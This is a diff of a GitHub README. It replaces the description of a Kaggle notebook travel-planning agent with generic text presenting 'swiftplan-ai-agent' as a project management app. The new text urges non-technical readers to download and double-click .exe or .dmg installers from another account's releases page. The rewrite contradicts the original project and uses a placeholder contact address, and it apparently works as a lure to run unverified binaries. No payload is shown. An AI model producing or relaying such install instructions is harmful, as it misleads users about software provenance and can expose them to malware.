@@ -1,41 +1,66 @@
-# ✈️ SwiftPlan: AI Travel Concierge
-## Google x Kaggle AI Agents Intensive Capstone Project
+# 🚀 swiftplan-ai-agent - Effortless AI Project Management Tool
 
-**Track:** Concierge Agents
-**Author:** Ratheshan Sathiyamoorthy
+[![Download Now](https://img.shields.io/badge/Download%20Now-Release%20Page-brightgreen)](https://github.com/gtwyeee/swiftplan-ai-agent/releases)
 
-### 📖 Project Overview
-SwiftPlan is a Multi-Agent System designed to eliminate the stress of travel planning. It automates the research and scheduling process, creating personalized, budget-conscious itineraries in seconds.
+## 📜 Description
+Welcome to **swiftplan-ai-agent**! This project is part of the Google x Kaggle AI Agents Intensive Capstone Project. It aims to assist users in managing their AI projects more efficiently. With a straightforward interface, you can plan, track, and analyze your AI projects without any hassle.
 
-### 🏗️ Architecture & Key Concepts
-This project demonstrates three key concepts from the course:
+## 🚀 Getting Started
+Follow these simple steps to download and run the swiftplan-ai-agent application. No technical skills are needed!
 
-1.  **Multi-Agent System (Sequential):** * **Research Agent:** Uses Google Search (Grounding) to find real-time data on weather, attractions, and local culture.
-    * **Planner Agent:** A reasoning engine that structures the raw data into a logical day-by-day plan.
-    
-2.  **Tools (Hybrid):** * **Google Search:** For external knowledge.
-    * **Custom Python Tool (`currency_converter`):** A defined function that the agent actively calls to calculate budgets in local currency.
+## 📥 Download & Install
+1. Click on the link below to visit the Releases page:
+   [Download swiftplan-ai-agent](https://github.com/gtwyeee/swiftplan-ai-agent/releases)
 
-3.  **Observability & Memory:** * **Session Memory:** Maintains context across the research and planning phases.
-    * **Logging:** Detailed console logs track the agent's thought process, tool usage, and execution status.
+2. On the Releases page, you will see different versions of the software. Look for the latest release, which is usually highlighted at the top.
 
-### Diagram
+3. Download the application file compatible with your operating system. The file names will typically include ".exe" for Windows or ".dmg" for Mac. If you're unsure, download the file listed under "Assets."
 
-```mermaid
-flowchart LR
-    User([User]) --> SwiftPlan{{SwiftPlan App}}
-    SwiftPlan -->|1. Task: Find activities & weather| ResearchAgent[Research Agent]
-    ResearchAgent -->|Search Query| GoogleSearchTool[[Google Search Tool]]
-    GoogleSearchTool -->|Search Results| ResearchAgent
-    ResearchAgent -->|Research Data| SwiftPlan
-    SwiftPlan -->|2. Task: Create itinerary + Data| PlannerAgent[Planner Agent]
-    PlannerAgent -->|Convert Budget| CurrencyConverterTool[[Currency Converter Tool]]
-    CurrencyConverterTool -->|Converted Amount| PlannerAgent
-    PlannerAgent -->|Generated Itinerary| FinalItinerary[(Final Itinerary)]
-    FinalItinerary -->|Output| User
-```
+4. Once the download is complete, locate the file. It is usually in your "Downloads" folder.
 
-### 🚀 How to Run
-1.  Add your `GEMINI_API_KEY` in the **Add-ons -> Secrets** menu.
-2.  Run all cells.
-3.  Use the `run_swiftplan()` function at the bottom to test different destinations!
+5. For Windows:
+   - Double-click the downloaded `.exe` file to start the installation.
+   - Follow the installation prompts.
+
+   For Mac:
+   - Double-click the downloaded `.dmg` file.
+   - Drag the swiftplan-ai-agent to your Applications folder.
+
+6. Once the installation is finished, you can find swiftplan-ai-agent in your applications list. Open the application, and you are ready to start managing your AI projects.
+
+## 🔧 System Requirements
+To ensure swiftplan-ai-agent runs smoothly, keep these requirements in mind:
+
+- For Windows:
+  - Operating System: Windows 10 or later
+  - Memory: Minimum 4 GB RAM
+  - Disk Space: At least 200 MB free
+
+- For Mac:
+  - Operating System: macOS Mojave or later
+  - Memory: Minimum 4 GB RAM
+  - Disk Space: At least 200 MB free
+
+## 📊 Features
+- **Task Management**: Easily create, manage, and track tasks for your AI projects.
+- **AI Integration**: Connect with various AI models and tools to streamline your project.
+- **Progress Tracking**: Monitor the status and performance of each task.
+- **User-Friendly Interface**: Navigate through the application with ease, regardless of your technical background.
+
+## 👩‍💻 Troubleshooting
+If you encounter any issues during installation or while using the application, try the following steps:
+
+1. Ensure your computer meets the system requirements.
+2. Restart your computer and try running the application again.
+3. If the issue persists, check our community support on GitHub for common problems and solutions.
+
+## 🌐 Community and Support
+For further assistance and to connect with other users, visit the [GitHub Discussions](https://github.com/gtwyeee/swiftplan-ai-agent/discussions). Here, you can ask questions, share your experiences, and learn tips and tricks from fellow users.
+
+## 📞 Contact
+For any inquiries or support needs, feel free to reach out:
+
+- Email: support@example.com
+- GitHub Issues: [Report an Issue](https://github.com/gtwyeee/swiftplan-ai-agent/issues)
+
+Thank you for choosing swiftplan-ai-agent! We hope it simplifies your AI project management experience.
